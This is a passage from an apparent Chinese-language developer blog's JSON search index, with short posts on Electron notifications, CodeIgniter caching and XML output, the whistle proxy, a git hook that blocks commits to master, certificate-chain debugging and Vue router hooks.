%}\n\n\n最後，就能順利使用`require('winapi').GetLastInputInfo`函式\n他會得到很多秒數\n\n另外\n有爬到另一個別人寫好整合\n他也包含MAC,Linux,Window 簡稱`idle time`(不知道是不是閒置時間意思??)\n[desktop-idle - npm](https://www.npmjs.com/package/desktop-idle)\n安裝下去使用不需設定index.js\n而且他的秒數比較直覺\n後來就用這個函式庫\n\n\n其他資訊:\n[[從libuv/v8到nodejs 系列] ：Libuv - 環境建置與說明 « YJ Blog](http://sj82516-blog.logdown.com/posts/3903966/from-libuv-v8-to-nodejs-series-libuv-environment-setting-and-description)\n[Electron通过ffi调用DLL - 陈海峰的博客 - CSDN博客](https://blog.csdn.net/chenhaifeng2016/article/details/75007006)\n[[Electron] 如何使用 Node.js 原生模組](https://note.pcwu.net/2017/03/29/js-electron-nodejs-modules/)\n[nodejs/node-gyp: Node.js native addon build tool](https://github.com/nodejs/node-gyp#installation)","tags":["electron"],"categories":["electron"]},{"title":"CI3 網頁緩存(web cache)小記","url":"%2Fblog%2F2018%2F10%2F13%2FCI3-%E7%B6%B2%E9%A0%81%E7%B7%A9%E5%AD%98-web-cache-%E5%B0%8F%E8%A8%98%2F","content":"\n最近做一個排行榜API\n但回傳時間真的太久了\n於是做一個緩存\n突然想到Codeigiter內建有網頁緩存裝置\n竟然內建有這個功能\n那還要自己手刻嗎XD\n\n<!--more-->\n\nPHP\n```php\n\t\tif(! isset($_SERVER['HTTP_X_KEY']) ||  $_SERVER['HTTP_X_KEY'] != \"xxxxxxx\")\n        {\n            http_response_code( 500 );\n            die( 'NO ENTER' );\n        }\n        header(\"x-api-key: xxxxxxx\");\n\t\t$this->output->cache(1);\n\t\techo \"hello world2\";\n```\n\n就這麼簡單!!!\n\n原本怕這邊簡單測試假如失敗的時候，會不會直接緩存\n會影響OK的，\n`測試結果是不會的`\n\ncache(`分鐘`)\n\n最後小記\n\n因為PHP Codeigiter是吃a權限(不是apache)\n但是cache是資料夾是設定755\n原本想先對cache做777\n其實我還不知道資料夾權限是吃什麼\n最後可以跑cache\n\n所以最後看到cache檔案室吃`apache`\n其實把那個資料夾改成`apache`權限就能用了\n也沒必要設定777\n\n假如真的覺得他的cache檔案設定不太好\n可以從設定檔設定放置路徑\n```\n$config['cache_path'] = \"\"。如果您不想使用默認的緩存目錄（system/cache/）來存儲緩存，可以設置完整的服務器目錄  \n```\n[【ci框架】config.php配置文檔解讀 - 掃文資訊](https://hk.saowen.com/a/2247a2730eb875d73a771b369fa169f2ec85e0a7766e7b9d69fe5cc1fded6849)\n\n\n有空來做php 讀取封包header筆記\n* [PHP 讀取客製化傳送進來的 HTTP Header | Tsung's Blog](https://blog.longwin.com.tw/2017/10/php-get-custom-http-header-2017/)\n* [PHP無法在$_SERVER內取得自訂header](https://kingfff.blogspot.com/2017/05/apache-php-header-server-invalid-characters-underscores.html)\n\n`apache_request_headers()`好像要裝apache套件才能用的樣子\n[PHP: getallheaders - Manual](http://php.net/manual/en/function.getallheaders.php)\n\n所以最後只能用原生PHP抓header方法\n參照[PHP無法在$_SERVER內取得自訂header](https://kingfff.blogspot.com/2017/05/apache-php-header-server-invalid-characters-underscores.html)\n順利解決","tags":["CI"],"categories":["Codeigiter"]},{"title":"whistle - 在Linux下類似Fiddler抓封包工具","url":"%2Fblog%2F2018%2F10%2F13%2Fwhistle-%E5%9C%A8Linux%E4%B8%8B%E9%A1%9E%E4%BC%BCFiddler%E6%8A%93%E5%B0%81%E5%8C%85%E5%B7%A5%E5%85%B7%2F","content":"\n最近工司需要測試APP API\n明天要帶我的Linux筆電到公司\n沒有類似Fiddler工具\n今天爬到一個好用的工具\n簡單筆記一下\n\n<!--more-->\n\n首先有找到在Linux 下開啟[Linux(Ubuntu)环境下使用Fiddler - 海鸟 - 博客园](https://www.cnblogs.com/jcli/p/4474332.html)\n但是我不通時裝其他的東西\n\n[httproxy - Fiddler 在 linux/OSx 下的替代品? - SegmentFault 思否](https://segmentfault.com/q/1010000000094520)\n\n裡面提到這些\n* [Linux(Ubuntu)环境下使用Fiddler - 海鸟 - 博客园](https://www.cnblogs.com/jcli/p/4474332.html)\n* [httproxy - Fiddler 在 linux/OSx 下的替代品? - SegmentFault 思否](https://segmentfault.com/q/1010000000094520)\n* [deemstone/Dproxy: Web调试代理,类似Fiddler的工具. 完全Nodejs编写,跨平台. A smarty proxy tool for web debugging, it's works like Fiddler.](https://github.com/deemstone/dproxy)\n* [Charles Web Debugging Proxy • HTTP Monitor / HTTP Proxy / HTTPS & SSL Proxy / Reverse Proxy](https://www.charlesproxy.com/)\n* [Wireshark · Download](https://www.wireshark.org/download.html)\n* [Fiddler Alternatives for Linux - AlternativeTo.net](https://alternativeto.net/software/fiddler/?platform=linux)\n* [goddyZhao/nproxy: A cli proxy tool specialized in file replacing](https://github.com/goddyZhao/nproxy)\n* [avwo/whistle: HTTP, HTTPS, WebSocket debugging proxy](https://github.com/avwo/whistle)\n* [AlloyTeam/Rythem: a fiddler-like project using Qt](https://github.com/AlloyTeam/Rythem)\n* [【AlloyTeam Web前端工具系列2】开源跨平台的Web抓包分析工具 Rythem (2012-09-19更新) | AlloyTeam](http://www.alloyteam.com/2012/05/web-front-end-tool-rythem-1/)\n\n\n最後我選擇，[avwo/whistle: HTTP, HTTPS, WebSocket debugging proxy](https://github.com/avwo/whistle)\n我Linux有裝nodejs，所以安裝設定有中文文件[关于whistle · GitBook](http://wproxy.org/whistle/)\n\n安裝方法\n```\nnpm install -g whistle\n```\n\n啟動\n```\nw2 start\n```\n\n結束\n```\nw2 stop\n```\n\n就這麼簡單!!!!\n\n{% asset_img 1.png \"whistle\" %}\n\n在接下來設定Android Wifi Proxy就完成了\n\n\n查看封包也是看Web介面xxx.xxx.xxx.xxx:8899\n\n但是設定proxy也是同一個port\n這是什麼巫術XDD\n\n\n**2021-05-02**\n\n[GitHub - youzan/zan-proxy: An extensible proxy for PC/Mobile/APP developer](https://github.com/youzan/zan-proxy)\n[GitHub - alibaba/anyproxy: A fully configurable http/https proxy in NodeJS](https://github.com/alibaba/anyproxy)\n","tags":["whistle"],"categories":["實用工具"]},{"title":"git保護分支不會被commit","url":"%2Fblog%2F2018%2F10%2F11%2Fgit%E4%BF%9D%E8%AD%B7%E5%88%86%E6%94%AF%E4%B8%8D%E6%9C%83%E8%A2%ABcommit%2F","content":"\n最近在pull master實候\n竟然發現merge....\n雖然不知道發生了什麼事情\n但不應該這樣\n後來找到是我在master commit!!!!!\n\n<!--more-->\n\n立馬不說，先壓縮一個檔案起來(裡面有程式還沒commit 怕怕)\n先用`git reset  xxxx^ --hard`\n順利還原!!!\n\n未了怕悲劇發生，於是我開始找如何防止master commit\n後來找到[Git Branch Warnings - Visual Studio Marketplace](https://marketplace.visualstudio.com/items?itemName=teledemic.branch-warnings)\n不過下載數不高，所以沒有使用\n\n最後找到[git hooks - prevent commit to local master branch and prevent push to remote master branch](https://gist.github.com/aaronhoffman/ffbfd36928f9336be2436cffe39feaec)\n```sh\n\n#!/bin/sh\n# prevent commit to local master branch\n\nbranch=`git symbolic-ref HEAD`\nif [ \"$branch\" = \"refs/heads/master\" ]; then\n    echo \"pre-commit hook: Can not commit to the local master branch.\"\n    exit 1\nfi\n\nexit 0\n```\n\n最後修改\n\n```sh\n\n#!/bin/sh\n# prevent commit to local master branch\n\nbranch=`git symbolic-ref HEAD`\nif [ \"$branch\" = \"refs/heads/master\" ] || [ \"$branch\" = \"refs/heads/mixed\" ]; then\n    echo \"pre-commit hook: Can not commit to the local master/mixed branch.\"\n    exit 1\nfi\n\nexit 0\n```\n\n放在`.git/hook/pre-commit`就完成\n\n","tags":["git hook"],"categories":["Git"]},{"title":"萬用憑證(WildCard)和中間憑證小記","url":"%2Fblog%2F2018%2F10%2F10%2F%E8%90%AC%E7%94%A8%E6%86%91%E8%AD%89-WildCard-%E5%92%8C%E4%B8%AD%E9%96%93%E6%86%91%E8%AD%89%E5%B0%8F%E8%A8%98%2F","content":"\n最近公司https網站很奇怪，桌面版的Chrome,Firefox顯示正常(安全)\n但是手機版的Chrome正常，Firefox不正常(非安全)\n倒置Line App內崁網頁不正常(連結https那台主機沒有正常跳頁)\n\n<!--more-->\n\n之前在保哥粉絲團看過[申請 Let's Encrypt 免費 SSL 憑證一次就上手](https://www.facebook.com/will.fans/videos/1760703873958749/)\n所以對憑證有基本的了解\n但沒深入了解\n\n目前有些網站憑證，手機版(Android)Webview會有問題。IOS皆正常\n但點入登入(網域)LINE會空白頁&Android Firefox會顯是為安全憑證\n\n正常桌面瀏覽器\n\n{% asset_img a.png a網域 %}\n{% asset_img b.png b網域 %}\n\n{% asset_img android_fierfox.png android_firefox %}\n{% asset_img line_webview.png line_webview %}\n\n\n發現公司不同子網域是用`萬用憑證`\n簡單來說就是`*.xxxx.com.tw`\n但問題來了...，為什麼a網段根b網段(都是*.xxxx.com.tw)\n為什麼a正常、b不正常\n\n最後爬到這個，[DigiCert 的证书，在浏览器（firefox，chrome）上都绿了应该没问题，但是 wget 总是出错 - V2EX](https://www.v2ex.com/t/138734)\nintermediate certifcate(中間憑證)有問題...\n瀏覽器會智能判斷，所以不會跳出錯誤\n經過實驗postman也不會出錯....(可能他是Chrome吧XD)\n\n{% asset_img curl_ok.png a網域可以連 %}\n{% asset_img curl_no_ok.png b網域不能連 %}\n\n感覺哪裡怪怪的\n後來發現[SSL Certificate Checker - Diagnostic Tool | DigiCert.com](https://www.digicert.com/help/)可以測試憑證\n\n\n{% asset_img a_digicert.png a_digicert檢查 %}\n{% asset_img b_digicert.png b_digicert檢查 %}\n\n\n{% asset_img yahoo_digicert.png 正常yahoo的 %}\n\n\n[你可能不知道的憑證大小事 - 吾輩乃程序猿](https://lv5.in/2016/11/22/%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E6%86%91%E8%AD%89%E5%A4%A7%E5%B0%8F%E4%BA%8B/)\n[[筆記] SSL 憑證購買記 - Yu-Cheng Chuang’s Blog](https://blog.yorkxin.org/2009/02/23/buying-a-turbo-ssl-cert.html)\n裡面有介紹中繼憑證可能會影像憑證安全性\n\n跟MIS說是憑證問題，可能要查看看\n不過MIS說是廠商給他的，所以可能他要問廠商才清楚\n目前查到這樣了\n\n其他相關筆記\n* [[Web] 注意 Wildcard 憑證的適用保護範圍 | EPH 的程式日記](https://ephrain.net/web-%E6%B3%A8%E6%84%8F-wildcard-%E6%86%91%E8%AD%89%E7%9A%84%E9%81%A9%E7%94%A8%E4%BF%9D%E8%AD%B7%E7%AF%84%E5%9C%8D/)\n* [如果您的用戶在Chrome與其他瀏覽器中看到警告資訊，那麼您需要做什麼 | DigiCert & Symantec](https://www.websecurity.symantec.com/zh/tw/blog/what-to-do-if-you-see-warning-messages-in-your-browser)\n","tags":["憑證"],"categories":["程式心法"]},{"title":"在手機上Firefox &Chrome 電腦除錯方法","url":"%2Fblog%2F2018%2F10%2F08%2F%E5%9C%A8%E6%89%8B%E6%A9%9F%E4%B8%8AFirefox-Chrome-%E9%9B%BB%E8%85%A6%E9%99%A4%E9%8C%AF%E6%96%B9%E6%B3%95%2F","content":"\n最近公司遇到在Line上面開網頁\n會空白頁面...(或正常頁面倒到那一台主機不會有跳頁)\n被收到需要做手機上的Debug\n當然之前有做過\n不過來記錄一次記錄\n因為不常做XD\n\n<!--more-->\n\n\n### 安裝 google adb driver\n原本想安裝自家的Driver\n不知道win7 x64好像不能用\n後來選擇google adb driver\n[小米5 ADB Interface 驅動程式安裝方式 - 小米手機5 - MIUI官方論壇](http://tw.miui.com/thread-24838-1-1.html)\n[Get the Google USB Driver  |  Android Developers](https://developer.android.com/studio/run/win-usb)\n\n由於有找到[[Android] Windows 安裝 Google 萬用 USB 驅動程式 | 熱血剪貼部](http://blog.ctrlxctrlv.net/adroid-google-usb-driver/)詳細文章({% asset_link \"1.jpg\" 備份圖 %})\n所以就沒花費這一塊做筆記了\n\n### Firefox安裝 Adb helper\n\n[WebIDE Add-ons](https://ftp.mozilla.org/pub/labs/fxos-simulator/)\n\n\n#### 開啟 WebIde\n由上角正常可以看到手機名稱\n\n(圖片待補)\n\n手機點選`允許`\n{% asset_img 2.jpg \"Android上的Firefox\" %}\n\n就可以看console\n\n### Chrome 除錯模式\n\n[遠程調試 Android 設備使用入門  |  Tools for Web Developers  |  Google Developers](https://developers.google.com/web/tools/chrome-devtools/remote-debugging/?utm_source=dcc&utm_medium=redirect&utm_campaign=2016q3)\n\n{% asset_img 3.png \"選單功能位置\" %}\n\n設定跟功能上比Firefox多\n設定步驟更簡單，可以直接看到網頁圖示\n\n\n\n最後憑證的問題還是不清楚為什麼orz","tags":["Chrome"],"categories":["實用工具"]},{"title":"CodeIgniter 輸出XML 筆記","url":"%2Fblog%2F2018%2F10%2F07%2FCodeIgniter-%E8%BC%B8%E5%87%BAXML-%E7%AD%86%E8%A8%98%2F","content":"\n最近收到要實作要回傳 XML 的 API\n不過，真得已經習慣用 PHP 做 JSON 格式\n只需要用 json_encode 就可以搞定\n\n<!--more-->\n\nPHP 本身函式就有對 XML 做解析\n不過組 XML 好像沒有比較好方式\n\n有查到[php - XML creation using CodeIgniter - Stack Overflow](https://stackoverflow.com/questions/10361074/xml-creation-using-codeigniter)\n\n[Database Utility Class — CodeIgniter 3.1.9 documentation](https://codeigniter.com/user_guide/database/utilities.html?highlight=xml_from_result#CI_DB_utility::xml_from_result)\n\n但這次 DB 剛好存的資料不是剛好要組出來的資料\n最終有網路看到原生支援的方法\n加上補`<![CDATA[ ]]!>`\n這一段是防止`>`符號產生錯誤\n也不用改寫成`&lt;`\n\n[XML CDATA](http://www.w3school.com.cn/xml/xml_cdata.asp)\n\nSimpleXMLElement 加上 CDATA 方法\n\n[php 使用 simpleXML 添加 CDATA 格式数据](https://fukun.org/archives/04192195.html)\n\n[php – 如何使用 SimpleXmlElement 编写 CDATA？ - 代码日志](https://codeday.me/bug/20170905/67209.html)\n\n[PHP: DOMDocument::createCDATASection - Manual](http://php.net/manual/en/domdocument.createcdatasection.php)\n\n```php\n<?php\n/**\n* to show <title lang=\"en\"><![CDATA[Site Title]]></title>   instead of <title lang=\"en\">Site Title</title>\n*\n*/\nclass SimpleXMLExtended extends SimpleXMLElement\n  {\n  public function addCData($cdata_text)\n    {\n    $node = dom_import_simplexml($this);\n    $no   = $node->ownerDocument;\n    $node->appendChild($no->createCDATASection($cdata_text));\n    }\n  }\n$xmlFile    = 'config.xml';\n// instead of $xml = new SimpleXMLElement('<sites/>');\n$xml = new SimpleXMLExtended('<sites/>');\n$site = $xml->addChild('site');\n// instead of $site->addChild('site', 'Site Title');\n$site->title = NULL; // VERY IMPORTANT! We need a node where to append\n$site->title->addCData('Site Title');\n$site->title->addAttribute('lang', 'en');\n$xml->asXML($xmlFile);\n?>\n```\n\n然後用 PHP 內建多行字串，需要注意用 NOWODC\n使用 HEREDOC，裡面有`$`會抓取 PHP 變數\n所以需要用 NOWDOC\n\n出輸內容\n\n[Output Class — CodeIgniter 3.1.5 documentation](https://codeigniter.org.tw/userguide3/libraries/output.html#CI_Output::set_content_type)\n\n```php\n$this->output\n        ->set_content_type('application/json')\n        ->set_output(json_encode(array('foo' => 'bar')));\n\n$this->output\n        ->set_content_type('jpeg') // You could also use \".jpeg\" which will have the full stop removed before looking in config/mimes.php\n        ->set_output(file_get_contents('files/something.jpg'));\n```\n\n結果\n\n研究完，收到要改寫回傳 JSON 的 api\n不過 json 會更簡單\n`json(xxxx,true)`\n跟\n\n```\n$json = [\n    \"test\"=>[\n        \"number=>[0,1,2,3,4,5]\n    ]\n]\n\n```\n\n寫法有空整理再發文\n\n2019-01-02 補充 Array to XML 的 Library\n[GitHub - Jeckerson/array2xml: [PHP] - Array to XML](https://github.com/Jeckerson/array2xml)\n\n[GitHub - spatie/array-to-xml: A simple class to convert an array to xml](https://github.com/spatie/array-to-xml)\n\n2019-03-12 用原生方法沒辦法載入\n[xml - How to get values inside <![CDATA[values]] > using php DOM? - Stack Overflow](https://stackoverflow.com/questions/6674322/how-to-get-values-inside-cdatavalues-using-php-dom)\n[xml - PHP: How to handle <![CDATA[ with SimpleXMLElement? - Stack Overflow](https://stackoverflow.com/questions/2970602/php-how-to-handle-cdata-with-simplexmlelement)\n\n```php\n$content = simplexml_load_string(\n    '<content><![CDATA[Hello, world!]]></content>'\n    , null\n    , LIBXML_NOCDATA\n);\n```\n\n[PHP 操作 XML | 程式前沿](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/110823/)\n","tags":["codeigenter"],"categories":["PHP"]},{"title":"electron win 10設定通知(AppUserModelId)&electron-builder相關NSIS設定","url":"%2Fblog%2F2018%2F10%2F01%2Felectron-win-10%E8%A8%AD%E5%AE%9A%E9%80%9A%E7%9F%A5-AppUserMOdelId-electron-builder%E7%9B%B8%E9%97%9C%E8%A8%AD%E5%AE%9A%2F","content":"\n解決上一篇遇到win10通知沒法出來\n[electron Notification win 10 失敗小記 | 程式狂想筆記](https://malagege.github.io/blog/2018/09/30/electron-Notification-win-10-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98/)\n最後仔細看了官方文件\n才解決.....\n\n<!--more-->\n\n首先，win8 之後應用程式做通知都需要註冊`AppModelUserId`\n在dev時候很難註冊到(沒有方法)\n在查詢一堆資料(NSIS....)\n發現需要做安裝動作\n才能註冊`AppModelUserId`\n\nnode-notifier是透過SnoreToast.exe程式呼叫\n所以其實也可以不用安裝這個\n\n首先來看官方AppUserModelId設定\n檔案請設定package.json(不是設定electron_dist裡面的)\n```json\n{\n    ...,(第一階層)\n    \"build\": {\n    \"appId\": \"com.example.app\"\n    }\n}\n```\n\n但可以注意到[Common Configuration - electron-builder](https://www.electron.build/configuration/configuration#configuration)\n```\nConfiguration¶\n\n    appId = com.electron.${name} String - The application id. Used as CFBundleIdentifier for MacOS and as Application User Model ID for Windows (NSIS target only, Squirrel.Windows not supported). It is strongly recommended that an explicit ID is set.\n    productName String - As name, but allows you to specify a product name for your executable which contains spaces and other special characters not allowed in the name property.\n    copyright = Copyright © year ${author} String - The human-readable copyright line for the app.\n```\nappId預設有設定\n所以其實用預設可以不用再package.json設定\n\n最後起在background.js裡面加入`app.setUserModelId(\"com.electron.exampleName\")`，最後exampleName改成package.json專案名子(name)\n\n之後安裝，執行程式可以看到通知結果\n\nNOTE: 通知安裝完，不會馬上在控制台看到程式設定\n要第一次通知才能看到\n{% asset_img 1.png \"Win10控制通知設定\" %}\n\n\n## NSIS  取消一件安裝、設定安裝路徑\n\n```json\n  ...,\n  \"build\":{\n    \"nsis\":{\n      \"oneClick\" : false,\n      \"allowToChangeInstallationDirectory\": true\n    }\n  }\n  \n```\noneClick是否為一鍵安裝\nallowToChangeInstallationDirectory是否讓User改安裝目錄\n\n更多設定我就不寫了\n[Common Configuration - electron-builder](https://www.electron.build/configuration/configuration#configuration)\n\n未來有空可以研究更新\n不過目前這個用不到\n先留者記錄\n[Electron应用使用electron-builder配合electron-updater实现自动更新 - 个人文章 - SegmentFault 思否](https://segmentfault.com/a/1190000012904543)","tags":["notification"],"categories":["JavaScript"]},{"title":"electron Notification win 10 失敗小記","url":"%2Fblog%2F2018%2F09%2F30%2Felectron-Notification-win-10-%E5%A4%B1%E6%95%97%E5%B0%8F%E8%A8%98%2F","content":"\n執行失敗，要算在復仇名單?\n還是放棄orz\n\n<!--more-->\n\n[node-notifier - 节点通知模块的问题](https://stackoverrun.com/cn/q/12037330)\n查到好像跟node-notifier有關係\n```\nSnoreToast.exe -p C：\\Projects\\testSnoreToast\\coulson.png -m Hello -t World -s Notification.Default -appID\n```\n貼到win10 cmd不能跑\n```\nSnoreToast.exe -m Hello -t World\n```\n就會正常看到通知了\n\n我測試我寫的vue-electron 竟然不能跑node-notifier\n但網路上有找到\n[explooosion/electron-alarm-clock: Sample apps for Electron](https://github.com/explooosion/electron-alarm-clock)\n抓下來可以正常執行...(electron 2.0~3.0也試過，範例都能跑，看來跟版本無關)\n\n目前懷疑是vue cli 3 electron環境執行node-notifier會有問題\n不過...嘗試著N方法也不行\nelectron 2.0~3.0都試過了...\n\n例如加上\n`app.setAppUserModelId(\"com.electron.test1\");`\n也許要用甚麼註冊AppUserModelId才能跑?\n\nID好像有命名規則\nCompanyName.ProductName.SubProduct.VersionInformation\n\n但還是不行 orz\n網路資源不多\n\n\n\n\nLinux試過都正常，win10不知道為什麼那麼難搞\n目前感覺原生electron 的Tray跟Notification  都在Win10失效了QQ","tags":["notification"],"categories":["JavaScruot"]},{"title":"vuejs hook和router hook小記","url":"%2Fblog%2F2018%2F09%2F30%2Fvuejs-hook%E5%92%8Crouter-hook%E5%B0%8F%E8%A8%98%2F","content":"\nvuejs hook和router hook小記\n\n<!--more-->\n\n{% asset_link vue_c_test_hook.zip 檔案 %}\n\n心得/紀錄:\n\nVue hook\n1. beforeCreate不會抓到this屬性(props,data)，原因還沒被做出來\n\n2. component剛建立出來，不會觸發到beforeUpdate,updated，只有template被更新的時候會觸發，但是!!!改data...等等沒觸發到template也不會有問題\n\nVue Router hook\n\n1. 進行第2次寫入，不會有效果，一樣保持第一次beforeEach hook東西，也許這跟event沒有關係，\n```js\n    //測試router hook\n    router.beforeEach((to,from,next)=>{\n        console.log('1');\n    });\n\n<!-- 進行第2次寫入，不會有效果，一樣保持第一次beforeEach hook東西\n也沒有看到文件說明 -->\nrouter.beforeEach((to,from,next)=>{\n    console.log('2');\n    console.log(to);\n    console.log(from);\n    console.log(next);\n});\n```\n\n2. Vue scrollBehavior 滚动行为，詳細看範例，這篇不好讀\n [Vue scrollBehavior 滚动行为 - 悦涵 - 博客园](https://www.cnblogs.com/sophie_wang/p/7880261.html)\n\n3. ~~全域router hook的`this`，應該是指router變數~~結果...我console.log出來是`underfined`\n\n子組件 hook\n\n1. \n```js\n  beforeRouteEnter (to, from, next) {\n    // 在渲染該組件的對應路由被 confirm 前調用\n    // 不！能！獲取組件實例 `this`\n    // 因為當守衛執行前，組件實例還沒被創建\n  },\n  beforeRouteUpdate (to, from, next) {\n    // 在當前路由改變，但是該組件被覆用時調用\n    // 舉例來說，對於一個帶有動態參數的路徑 /foo/:id，在 /foo/1 和 /foo/2 之間跳轉的時候，\n    // 由於會渲染同樣的 Foo 組件，因此組件實例會被覆用。而這個鉤子就會在這個情況下被調用。\n    // 可以訪問組件實例 `this`\n  },\n  beforeRouteLeave (to, from, next) {\n    // 導航離開該組件的對應路由時調用\n    // 可以訪問組件實例 `this`\n  }\n```\n\nmeta 這方面就看官網範例，可以看一下範例註解\n\n\n順便一提，css有一個[scroll-behavior - CSS: Cascading Style Sheets | MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/scroll-behavior)\n但是跟vue沒關係\n\n[理解 $nextTick 的作用](https://zhuanlan.zhihu.com/p/26724001)還沒有研究，剩下就是vuex\n\n參考來源:\n[javascript - vue-router钩子beforeRouteEnter函数获取到this实例 - SegmentFault 思否](https://segmentfault.com/q/1010000008973485)\n[路由元信息 | Vue Router](https://router.vuejs.org/zh/guide/advanced/meta.html)\n[导航守卫 | Vue Router](https://router.vuejs.org/zh/guide/advanced/navigation-guards.html#%E5%AE%8C%E6%95%B4%E7%9A%84%E5%AF%BC%E8%88%AA%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B)\n[scroll-behavior - CSS: Cascading Style Sheets | MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/scroll-behavior)\n[Vue scrollBehavior 滚动行为 - 悦涵 - 博客园](https://www.cnblogs.com/sophie_wang/p/7880261.html)\n[理解 $nextTick 的作用](https://zhuanlan.zhihu.com/p/26724001)\n[vue2学习篇一 vue-router 导航钩子 丨 智杰之家 - 关注互联网开发](https://www.zhi-jie.net/vue2-study-vue-router-navigation-hook/)","tags":["vue"],"categories":["JavaScript"]},{"title":"vueJS router 新手小試2","url":"%2Fblog%2F2018%2F09%2F27%2FvueJS-router-%E6%96%B0%E6%89%8B%E5%B0%8F%E8%A9%A62%2F","content":"\n補充上一篇東西\n這次有加入了分頁功能\n\n<!--more-->\n\n{% asset_link code.zip \"範例程式\" %}\n\n心得/開發問題\n\n1. transition-group mode沒有效果，transition-group有v-move移轉特效\n網路上有找到用transition-delay來解決問題\n[Allow mode for transition-group · Issue #3974 · vuejs/vue · GitHub](https://github.com/vuejs/vue/issues/3974)\n\n2. 上一篇data binding雙向綁定問題，可以使用`:value`做綁定\n但是發現radio會失效，雖然可以使用name方式解決，但是感覺不太滿意\n最後想到用`JSON.parse(JSON.stringify(xxx))`解決\n~~但放到`mounted`從`/edit/:id`進來吃不到this.data~~\n最後想到用computed解決\n(PS:好像是template出錯，有嘗試著用v-if閃過，但我覺得還是`computed`解比較漂亮)\n2018/09/28 重新實作[JS Bin - Collaborative JavaScript Debugging](http://jsbin.com/siciwelobo/1/edit?html,js,output)\n功能有正常出來\n\n\n3. 最後新增資料/修改資料，回去首頁的時候，資料還是舊的！我以為是拿出跟之前畫面一樣\n但我發現我錯了，簡單做個小實驗\n發現router 回去component物件都還會還原，但是`data`資料不會\n\n{% asset_img 1.gif title %}\n\n但是...是vue-router問題，還是component也會這樣\n\n所以，還是實驗一下到底發生甚麼事情\n\n`參考vue_c_test.html`\n\nvuerouter跟一般component一樣\n會重新產出\n\n但是我的回首頁狀態還在\n到底發生甚麼事情\n**後來突然想到會不會父組件傳data給子組件**\n所以才會造成資料不會重新整理\n\n**router 踩雷小記**\nrouter 載入compoent是分開的!!!這個好雷\n[Using a component name in a route definition · Issue #77 · vuejs/vue-router](https://github.com/vuejs/vue-router/issues/77)\n```js\n    var router = new VueRouter({\n        routes: [\n  { path: '/a', component: Vue.component('a-component') },\n  //router 載入compoent是分開的!!!這個好雷\n  //[Using a component name in a route definition · Issue #77 · vuejs/vue-router](https://github.com/vuejs/vue-router/issues/77)\n  { path: '/b', component: BComponent }\n]\n    });\n```\n\n\n4. `res.headers.get(\"X-Total-Count\");`得出來是數字，放到component可能要注意轉型，`parseInt(xxx)`\n```\n[Vue warn]: Invalid prop: type check failed for prop \"records\". Expected Number, got String.\n\nfound in\n```\n\n\n[vue2学习篇一 vue-router 导航钩子 丨 智杰之家 - 关注互联网开发](https://www.zhi-jie.net/vue2-study-vue-router-navigation-hook/)\nrouter hook我還沒有玩到\n看來我覺得還會有vueJS-router 新手小記3","tags":["vue"],"categories":["JavaScript"]},{"title":"vscode ES6 template literal HTML亮字提示","url":"%2Fblog%2F2018%2F09%2F27%2Fvscode-ES6-template-literal-HTML%E4%BA%AE%E5%AD%97%E6%8F%90%E7%A4%BA%2F","content":"\n最近使用vscode練vuejs，還沒使用`vue cli`\n想說現在公司專案碰vue cli，微乎其微\n但是使用單存vuejs，我覺得還有機會\n當然要先熟悉web一下\n\n<!--more-->\n\n現在我寫程式都是使用vscode\n但最近寫vuejs template沒有變色文字\n真的好不習慣，又很傷眼睛\n\n所以就找了一下vscode有沒有好用的套件\n\n## es6-string-html\n\n{% asset_img 1.jpg \"\" %}\n\n只要前面帶`/*html*/`，就有完美亮點提示\n\n完美\n剛好平常php專案可以考慮這樣用\n現在不用考慮IE8了XD","tags":["vscode"],"categories":["實用工具"]},{"title":"vueJS router 新手小試","url":"%2Fblog%2F2018%2F09%2F26%2FvueJS-router-%E6%96%B0%E6%89%8B%E5%B0%8F%E8%A9%A6NOTE%2F","content":"\n最近看了alex直播全家桶，也看了官網router範例\n看官網範例可以[vuejs/vue-router: 🚦 The official router for Vue.js.](https://github.com/vuejs/vue-router) git clone回去\n```\nnpm install \nnpm run dev\n```\n有看有懂，但實戰就忘了一堆XD\n還是留一下比較\n<!--more-->\n\n先小記我寫router問題/心得\n有搭配json-server\n`json-server db.json --static .`\nhttp://localhost:3000/index.htm\n可以進入到網頁\n\n{% asset_link \"code.7z\" 程式檔案 %}\n\n1. 使用router 帶入param沒法帶vue本生data到component裡面\n目前雖然用js閉包做到，但這樣不好看....，目前找不到方法，然到真的用vuex最佳解?\n\n2. router  可以算是全域變數，一直看範例以為要`this.$router`才能用\n(目前猜測 `new Vue`出來變數可能用`$xxx`可以抓到)\n```\nnew Vue({\n    el,\n    router,\n    data\n})\n```\n\n3. 第一次嘗試ES6完整縮寫，看起來清爽多了\n`this.directorys.splice(this.directorys.findIndex( el => el.id == id), 1)`\n\n4.  Router傳參數好像不太方便，但說不定有更好的方法(我還沒有嘗試用vuex)\n```\n// { path: '/edit/:id', component: Edit_c, props: ()=>{ return { data : data.directorys.find( el =>{return el.id == 1 })}  }}\n    //帶router帶參數好像只能用props: true\n    // { path: '/edit/:id', component: Edit_c, props: ()=>{ return { data : JSON.parse(JSON.stringify(data.directorys.find( el =>{return el.id == 1 })))}  }}\n    //router 帶 props 會連動 地雷，可用json parse stringify 來解決\n    // 但好像不太能這樣用，一進/edit/xx 會出錯\n```\n\n5. ajax,fetch,axios 差別，目前查到的資料fetch是基於promise，axios是`XHR`加Promise，所以很多人都推axios\n但我為什麼先用fetch呢?其實是懶得cdnjs找套件XD\n```\n            fetch('/directorys',{\n                method: 'GET'\n            }).then((res)=>{\n                if (!res.ok) throw new Error(res.statusText)\n                return res.json();\n            }).then((data)=>{\n                this.directorys = data;\n            });\n```\n[Using Fetch - Web APIs | MDN](https://developer.mozilla.org/zh-TW/docs/Web/API/Fetch_API/Using_Fetch)\n\n* [从ajax到fetch、axios - 掘金](https://juejin.im/post/5acde23c5188255cb32e7e76)\n* [Jquery ajax, Axios, Fetch区别之我见 - 都选C - SegmentFault 思否](https://segmentfault.com/a/1190000012836882)\n* [ajax、axios、fetch之间的详细区别以及优缺点 - CSDN博客](https://blog.csdn.net/twodogya/article/details/80223508)\n\n6.  Array.prototype.find ,Array.prototype.findIndex很實用\n\n7. 